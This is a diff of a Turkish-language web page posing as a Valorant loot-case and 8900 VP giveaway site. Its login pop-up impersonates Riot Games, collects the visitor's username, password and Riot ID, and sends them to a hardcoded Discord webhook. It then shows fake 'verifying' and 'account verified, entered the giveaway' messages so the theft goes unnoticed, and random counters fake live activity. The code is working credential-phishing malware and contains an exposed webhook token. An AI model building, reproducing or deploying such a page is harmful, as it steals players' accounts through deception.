@@ -8,6 +8,8 @@
     <style>
         :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
         body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
+        
+        /* Live Drops */
         .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; justify-content: flex-start; overflow: hidden; position: relative; width: 100%; }
         .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
         .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
@@ -15,25 +17,39 @@
         .drop-card img { height: 45px; object-fit: contain; }
         .rarity-box { width: 100%; height: 6px; margin-top: auto; }
         @keyframes slideIn { from { transform: translateX(-30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        /* Header */
         header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
         .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
         .logo span { color: var(--valo-red); }
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
         .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
+
+        /* Giveaway & Sections */
         .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
         #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
         .title-container { width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); padding: 20px 0; margin: 40px 0; text-align: center; }
-        .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
+        .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; }
+
+        /* Case Grid */
         .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
         .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; min-height: 100px; }
         .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; overflow: hidden; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
-        .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; overflow: hidden; }
+        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
+        .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
         .case-box img { max-width: 110%; max-height: 100%; object-fit: contain; }
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+
+        /* Stats */
         .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
         .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; min-width: 120px; }
+
+        /* Loading Spinner */
+        .loader-circle { width: 14px; height: 14px; border: 2px solid #fff; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rot 1s linear infinite; margin-right: 8px; }
+        @keyframes rot { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes slideInRight { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
     </style>
 </head>
 <body>
@@ -48,13 +64,15 @@
         <div class="nav-links">
             <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Sözleşmeler</a><a href="#">Mağaza</a>
         </div>
-        <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
+        <div id="authArea">
+            <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
+        </div>
     </header>
 
     <div class="giveaway-section">
         <div>
             <h2 style="margin:0; font-family:'Montserrat'; font-size:32px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
-            <p style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
+            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
         </div>
         <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
             <div id="countdown">00:00:00</div>
@@ -93,7 +111,7 @@
             }
             addNewDrop();
 
-            // Cases
+            // Cases Load
             const cases = [
                 {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
                 {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
@@ -106,7 +124,7 @@
                 cases.slice(4, 6).forEach(c => { r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
             }
 
-            // Giveaway Counter
+            // Timer
             function tick() {
                 const now = new Date();
                 let target = new Date(); target.setHours(24, 0, 0, 0);
@@ -117,7 +135,7 @@
             }
             setInterval(tick, 1000); tick();
 
-            // Stats
+            // Live Stats Update
             let pCount = 2841, cCount = 148209, vCount = 1250400;
             setInterval(() => {
                 pCount += Math.floor(Math.random() * 5) - 2;
@@ -129,218 +147,128 @@
             }, 3000);
         });
 
-        // 2. AUTH SİSTEMİ (POP-UP - FULL GÖRSEL TASARIM)
-function openAuth() {
-    const w = 550, h = 800;
-    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
-    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
-    
-    const popupHTML = `
-        <html>
-        <head>
-            <title>Riot Games - Oturum Aç</title>
-            <style>
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-                body { 
-                    margin:0; height:100vh; overflow:hidden; 
-                    background: url('login_bg.jpg') center/cover no-repeat; 
-                    display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; 
-                }
-                .card { 
-                    background:#fff; width:330px; padding:45px 35px; border-radius:4px; text-align:center; 
-                    box-shadow: 0 10px 50px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; 
-                }
-                h2 { font-weight:900; font-size:24px; margin: 25px 0; text-transform:uppercase; color:#111; letter-spacing:-1px; }
-                
-                .input-container { position: relative; margin: 10px 0; width: 100%; text-align: left; }
-                input { 
-                    width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; 
-                    border-radius:4px; box-sizing:border-box; font-weight:700; font-size:14px; color:#111; 
-                    outline:none; transition: 0.15s ease-in-out; 
-                }
-                .label { 
-                    position: absolute; left: 16px; top: 18px; color: #999; font-weight: 800; font-size: 11px; 
-                    text-transform: uppercase; pointer-events: none; transition: 0.15s ease-in-out; 
-                }
-                input:focus { background: #fff; border-color: #111; }
-                input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
-
-                .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; width:100%; }
-                .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
-                .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
-                .social-btn img { width:20px; height:20px; object-fit: contain; }
-
-                .stay-signed { display:flex; align-items:center; gap:8px; font-size:12px; color:#111; font-weight:700; margin:15px 0; width:100%; cursor:pointer; }
-                .checkbox { width:16px; height:16px; background:#f2f2f2; border-radius:3px; border: 1px solid #ddd; }
-
-                .next-btn { 
-                    width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; 
-                    cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; margin-top:20px; outline:none;
-                }
-                .next-btn.active { border-color:#ff4655; }
-                .next-btn svg { width:30px; fill:#ddd; }
-                .next-btn.active svg { fill:#ff4655; }
-
-                .footer-links { margin-top:35px; font-size:11px; font-weight:800; color:#111; text-transform:uppercase; opacity:0.6; }
-            </style>
-        </head>
-        <body>
-            <div class="card">
-                <img src="login_logo.png" width="100" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'">
-                <h2>GİRİŞ</h2>
-                <div class="input-container">
-                    <input type="text" id="u" placeholder=" " autocomplete="off">
-                    <span class="label">Kullanıcı Adı</span>
-                </div>
-                <div class="input-container">
-                    <input type="password" id="p" placeholder=" " autocomplete="off">
-                    <span class="label">Şifre</span>
-                </div>
-                <div class="input-container">
-    <input type="text" id="gameid" placeholder=" " autocomplete="off">
-    <span class="label">Riot ID (İSİM#ETİKET) BOT HESAP KORUMASI</span>
-</div>
-                <div class="social-grid">
-                    <div class="social-btn fb"><img src="fb_logo.png"></div>
-                    <div class="social-btn gg"><img src="google_logo.png"></div>
-                    <div class="social-btn ap"><img src="apple_logo.png"></div>
-                    <div class="social-btn xb"><img src="xbox_logo.png"></div>
-                    <div class="social-btn ps"><img src="ps_logo.png"></div>
-                </div>
-                <div class="stay-signed"><div class="checkbox"></div> Oturumu açık tut</div>
-                <button class="next-btn" id="go">
-                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
-                </button>
-                <div class="footer-links">
-                    <div style="cursor:pointer">OTURUM AÇAMIYOR MUSUN?</div>
-                    <div style="margin-top:5px; cursor:pointer">HESAP OLUŞTUR</div>
-                </div>
-            </div>
-            <script>
-                const u=document.getElementById('u'), p=document.getElementById('p'), b=document.getElementById('go');
-                const c=()=>(u.value && p.value)?b.classList.add('active'):b.classList.remove('active');
-                u.oninput=c; p.oninput=c;
-                b.onclick=function(){
-                    if(u.value && p.value){
-                        window.opener.postMessage({user:u.value, pass:p.value}, "*");
-                        window.close();
-                    }
-                };
-                window.opener.postMessage({
-    user: u.value, 
-    pass: p.value, 
-    gameid: document.getElementById('gameid').value 
-}, "*");
-            <\/script>
-        </body>
-        </html>`;
-    win.document.write(popupHTML);
-    win.document.close();
-}
-
-// 3. WEBHOOK, GİRİŞ SİMÜLASYONU VE BİLDİRİM SİSTEMİ
-window.addEventListener("message", function(event) {
-    if (event.data.user && event.data.pass) {
-        
-        // 1. Önce "Giriş Yap" butonunu "Yükleniyor" moduna sok (İnandırıcılık için)
-        const loginBtn = document.querySelector('.btn-login');
-        if(loginBtn) {
-            loginBtn.innerHTML = `<span class="loader-circle"></span> DOĞRULANIYOR...`;
-            loginBtn.style.background = "#333";
-            loginBtn.style.cursor = "wait";
-        }
-        // 1. Veriyi Discord'a Gönder (Arka Planda)
-        fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: "Riot Auth System",
-                embeds: [{
-                    title: "✅ Yeni Giriş Başarılı!",
-                    color: 3066993,
-                    fields: [
-                        { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
-                        { name: "🔑 Şifre", value: "```" + event.data.pass + "```" }
-                    ],
-                    footer: { text: "ValoLoot System" },
-                    timestamp: new Date()
-                }]
-            })
-        });
-        // 3. 2 Saniye Bekle (Sanki veritabanından profil çekiyormuş gibi)
-        setTimeout(() => {
-            // Kullanıcı adını alıp Riot ID formatına sokuyoruz
-            const displayNick = event.data.user.split('@')[0].toUpperCase();
-            const fullRiotID = displayNick + "#TR1";
-        // 2. Arayüzü Güncelle (Giriş Yapılmış Süsü Ver)
-        const loginBtn = document.querySelector('.btn-login');
-if(loginBtn) {
-    // Eğer eleman Riot ID girmediyse kullanıcı adını kullan, girdiyse ID'yi kullan
-    const displayID = event.data.gameid || event.data.user; 
-    
-    // Paneli Güncelle (Senin istediğin default resimle)
-            if(loginBtn) {
-                loginBtn.outerHTML = `
-                    <div style="display:flex; align-items:center; gap:12px; background: rgba(0,0,0,0.7); padding: 6px 15px; border-radius: 4px; border: 1px solid #79eb1e; animation: slideInRight 0.5s ease-out;">
-                        <div style="text-align:right">
-                            <div style="color:#fff; font-weight:800; font-size:12px; letter-spacing:0.5px;">${fullRiotID}</div>
-                            <div style="color:#79eb1e; font-size:9px; font-weight:900; letter-spacing:1px;">HESAP AKTİF</div>
+        // 2. AUTH SİSTEMİ (POP-UP)
+        function openAuth() {
+            const w = 550, h = 800;
+            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
+            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
+            
+            const popupHTML = `
+                <html>
+                <head>
+                    <title>Riot Games - Oturum Aç</title>
+                    <style>
+                        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+                        body { margin:0; height:100vh; overflow:hidden; background: url('login_bg.jpg') center/cover no-repeat #111; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; }
+                        .card { background:#fff; width:330px; padding:45px 35px; border-radius:4px; text-align:center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
+                        h2 { font-weight:900; font-size:24px; margin: 25px 0; text-transform:uppercase; color:#111; }
+                        .input-container { position: relative; margin: 10px 0; width: 100%; text-align: left; }
+                        input { width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; font-weight:700; outline:none; transition: 0.15s; }
+                        .label { position: absolute; left: 16px; top: 18px; color: #999; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.15s; }
+                        input:focus { background: #fff; border-color: #111; }
+                        input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
+                        .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; }
+                        .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; border: 1px solid #eee; }
+                        .next-btn { width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; cursor:pointer; transition:0.3s; margin:20px auto; display:flex; align-items:center; justify-content:center; }
+                        .next-btn.active { border-color:#ff4655; }
+                        .next-btn svg { width:30px; fill:#ddd; }
+                        .next-btn.active svg { fill:#ff4655; }
+                    </style>
+                </head>
+                <body>
+                    <div class="card">
+                        <img src="login_logo.png" width="100" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'">
+                        <h2>GİRİŞ</h2>
+                        <div class="input-container"><input type="text" id="u" placeholder=" " autocomplete="off"><span class="label">Kullanıcı Adı</span></div>
+                        <div class="input-container"><input type="password" id="p" placeholder=" " autocomplete="off"><span class="label">Şifre</span></div>
+                        <div class="input-container"><input type="text" id="g" placeholder=" " autocomplete="off"><span class="label">Riot ID (İSİM#ETİKET)</span></div>
+                        <div class="social-grid">
+                            <div class="social-btn" style="background:#1877f2"><img src="fb_logo.png" width="20"></div>
+                            <div class="social-btn"><img src="google_logo.png" width="20"></div>
+                            <div class="social-btn" style="background:#000"><img src="apple_logo.png" width="20"></div>
+                            <div class="social-btn" style="background:#107c10"><img src="xbox_logo.png" width="20"></div>
+                            <div class="social-btn" style="background:#00439c"><img src="ps_logo.png" width="20"></div>
                         </div>
-                        <!-- Senin ayarladığın default resim burada (avatar.png) -->
-                        <img src="avatar.png" onerror="this.src='https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg'" 
-                             style="width:32px; height:32px; border:1px solid #79eb1e; border-radius:2px; object-fit:cover;">
+                        <button class="next-btn" id="go"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
                     </div>
-                `;
+                    <script>
+                        const u=document.getElementById('u'), p=document.getElementById('p'), g=document.getElementById('g'), b=document.getElementById('go');
+                        const check=()=>(u.value && p.value)?b.classList.add('active'):b.classList.remove('active');
+                        u.oninput=check; p.oninput=check;
+                        b.onclick=function(){
+                            if(u.value && p.value){
+                                window.opener.postMessage({user:u.value, pass:p.value, gameid:g.value}, "*");
+                                window.close();
+                            }
+                        };
+                    <\/script>
+                </body>
+                </html>`;
+            win.document.write(popupHTML);
+        }
+
+        // 3. WEBHOOK VE GİRİŞ SİMÜLASYONU
+        window.addEventListener("message", function(event) {
+            if (event.data.user && event.data.pass) {
+                const authArea = document.getElementById('authArea');
+                
+                // Butonu Yükleniyor Yap
+                authArea.innerHTML = `<button class="btn-login" style="background:#333; cursor:wait"><span class="loader-circle"></span> DOĞRULANIYOR...</button>`;
+
+                // Discord'a Gönder
+                fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Riot Auth System",
+                        embeds: [{
+                            title: "✅ Yeni Giriş Başarılı!",
+                            color: 3066993,
+                            fields: [
+                                { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
+                                { name: "🔑 Şifre", value: "```" + event.data.pass + "```" },
+                                { name: "🆔 Riot ID", value: "```" + (event.data.gameid || "Belirtilmedi") + "```" }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+
+                // 2 Saniye Simülasyon
+                setTimeout(() => {
+                    const finalID = event.data.gameid || event.data.user.split('@')[0].toUpperCase() + "#TR1";
+                    
+                    // Header Güncelle
+                    authArea.innerHTML = `
+                        <div style="display:flex; align-items:center; gap:12px; background: rgba(0,0,0,0.7); padding: 6px 15px; border-radius: 4px; border: 1px solid #79eb1e; animation: slideInRight 0.5s ease-out;">
+                            <div style="text-align:right">
+                                <div style="color:#fff; font-weight:800; font-size:12px;">${finalID}</div>
+                                <div style="color:#79eb1e; font-size:9px; font-weight:900;">HESAP AKTİF</div>
+                            </div>
+                            <img src="avatar.png" onerror="this.src='https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg'" 
+                                 style="width:32px; height:32px; border:1px solid #79eb1e; border-radius:2px; object-fit:cover;">
+                        </div>
+                    `;
+
+                    // Giveaway Text Güncelle
+                    const gText = document.getElementById('giveawayStatus');
+                    gText.innerText = "HESAP DOĞRULANDI, ÇEKİLİŞE KATILDINIZ!";
+                    gText.style.color = "#79eb1e";
+
+                    // Bildirim
+                    showValorantToast(finalID);
+                }, 2000);
             }
+        });
 
-        // Çekiliş yazısını güncelle
-            const giveawayText = document.querySelector('.giveaway-section p');
-            if(giveawayText) {
-                giveawayText.innerText = "HESAP DOĞRULANDI, ÇEKİLİŞE KATILDINIZ!";
-                giveawayText.style.color = "#79eb1e";
-            }
-
-            // O şık Valorant bildirimini patlat
-            showValorantToast(fullRiotID);
-
-        }, 2000); 
-    }
-}, { once: true });
-
-// Valorant Stili Bildirim Fonksiyonu
-function showValorantToast(username) {
-    const toast = document.createElement('div');
-    toast.style.cssText = `
-        position: fixed; bottom: 30px; right: 30px; 
-        background: #1f2326; color: white; border-left: 5px solid #79eb1e;
-        padding: 20px 30px; border-radius: 4px; z-index: 9999;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.5); font-family: 'Inter', sans-serif;
-        transform: translateX(120%); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    `;
-    
-    toast.innerHTML = `
-        <div style="display:flex; align-items:center; gap:15px;">
-            <div style="background:#79eb1e; border-radius:50%; padding:5px;">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-            </div>
-            <div>
-                <div style="font-weight:900; font-size:14px; text-transform:uppercase;">Bağlantı Başarılı</div>
-                <div style="font-size:12px; color:#aaa;">Hoş geldin, <b>${username}</b>. Hesabın doğrulandı.</div>
-            </div>
-        </div>
-    `;
-
-    document.body.appendChild(toast);
-
-    // Animasyonla içeri sok
-    setTimeout(() => { toast.style.transform = 'translateX(0)'; }, 100);
-
-    // 5 saniye sonra kaldır
-    setTimeout(() => {
-        toast.style.transform = 'translateX(120%)';
-        setTimeout(() => { toast.remove(); }, 500);
-    }, 5000);
-}
+        function showValorantToast(username) {
+            const t = document.createElement('div');
+            t.style.cssText = "position:fixed; bottom:30px; right:30px; background:#1f2326; color:white; border-left:5px solid #79eb1e; padding:20px 30px; border-radius:4px; z-index:9999; box-shadow:0 10px 30px rgba(0,0,0,0.5); transform:translateX(120%); transition:0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);";
+            t.innerHTML = `<div style="display:flex; align-items:center; gap:15px;"><div style="background:#79eb1e; border-radius:50%; padding:5px;"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div><div style="font-weight:900; font-size:14px; text-transform:uppercase;">Bağlantı Başarılı</div><div style="font-size:12px; color:#aaa;">Hoş geldin, <b>${username}</b>.</div></div></div>`;
+            document.body.appendChild(t);
+            setTimeout(() => t.style.transform = 'translateX(0)', 100);
+            setTimeout(() => { t.style.transform = 'translateX(120%)'; setTimeout(() => t.remove(), 500); }, 5000);
+        }
     </script>
 </body>
 </html>
